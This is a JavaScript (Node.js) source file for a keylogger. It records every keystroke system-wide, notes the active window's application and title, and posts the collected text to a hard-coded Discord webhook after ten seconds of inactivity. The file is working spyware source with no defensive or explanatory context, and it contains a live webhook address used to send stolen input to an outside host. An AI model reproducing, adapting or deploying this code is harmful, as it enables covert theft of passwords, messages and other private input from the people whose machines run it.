const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener
const axios = require('axios')

const v = new GlobalKeyboardListener();

var l_shift_dn = false
var l_alt_dn = false
var r_shift_dn = false
var r_alt_dn = false
var keylogs = '';
var monitor = require('active-window');

let debounceTimeout = null;

//Log every key that's pressed.
v.addListener(function (e, down) {
    // console.log(
    //     `${e.name} ${e.state == "DOWN" ? "DOWN" : "UP  "} [${e.rawKey._nameRaw}]`
    // )
    if (e.state == "UP") {
        switch (e.name) {
            case 'TAB':
                process.stdout.write('<TAB>');
                keylogs += '<TAB>'
                break;
            case 'RETURN':
                process.stdout.write('<ENTER>');
                keylogs += '<ENTER>'
                break;
            case 'SPACE':
                process.stdout.write(' ');
                keylogs += ' '
                break;
            case 'ESCAPE':
                process.stdout.write('<ESC>');
                keylogs += '<ESC>'
                break;
            case 'DELETE':
                process.stdout.write('<DEL>');
                keylogs += '<DEL>'
                break;
            case 'BACKSPACE':
                process.stdout.write('<B.SPACE>');
                keylogs += '<B.SPACE>'
                break;
            case 'LEFT SHIFT':
                process.stdout.write('</L.SHIFT>');
                keylogs += '</L.SHIFT>'
                l_shift_dn = false
                break;
            case 'LEFT ALT':
                process.stdout.write('</L.ALT>');
                keylogs += '</L.ALT>'
                break;
            case 'RIGHT SHIFT':
                process.stdout.write('</R.SHIFT>');
                keylogs += '</R.SHIFT>'
                break;
            case 'RIGHT ALT':
                process.stdout.write('</R.ALT>');
                keylogs += '</R.ALT>'
                break;
            default:
                process.stdout.write(e.name);
                keylogs += e.name
        }
    }

    if (e.state == "UP") {
        clearTimeout(debounceTimeout);
        debounceTimeout = setTimeout(sendToWebhook, 1000 * 10); // 10 seconds
    }

    if (e.state == "DOWN") {
        switch (e.name) {
            case 'LEFT SHIFT':
                if (l_shift_dn == false) {
                    l_shift_dn = true
                    process.stdout.write('<L.SHIFT>');
                    keylogs += '<L.SHIFT>'
                }
                break;
            case 'LEFT ALT':
                process.stdout.write('<L.ALT>');
                keylogs += '<L.ALT>'
                break;
            case 'RIGHT SHIFT':
                process.stdout.write('<R.SHIFT>');
                keylogs += '<R.SHIFT>'
                break;
            case 'RIGHT ALT':
                process.stdout.write('<R.ALT>');
                keylogs += '<R.ALT>'
                break;
        }
    }


});


function getWindowInfo() {
    return new Promise((resolve) => {
        callback = function (window) {
            try {
                console.log("Window object: ", window);
                resolve({ app: window.app, title: window.title });
            } catch (err) {
                console.log(err);
            }
        }

        monitor.getActiveWindow(callback, 1, 1);
    });
}

const sendToWebhook = async () => {
    let window = await getWindowInfo();

    await axios.post('https://discord.com/api/webhooks/1235971762596876318/_zA0_soKb9WqWpubCPnid3tNptxi4onoze9CVigNaIopc2CTIzodzR68LMjYdYZ-wybh', {
        "content": `Keylogs: ${keylogs}\nApp: ${window.app}\nTitle: ${window.title}`
    }).then(async () => {
        keylogs = ''
    });
};
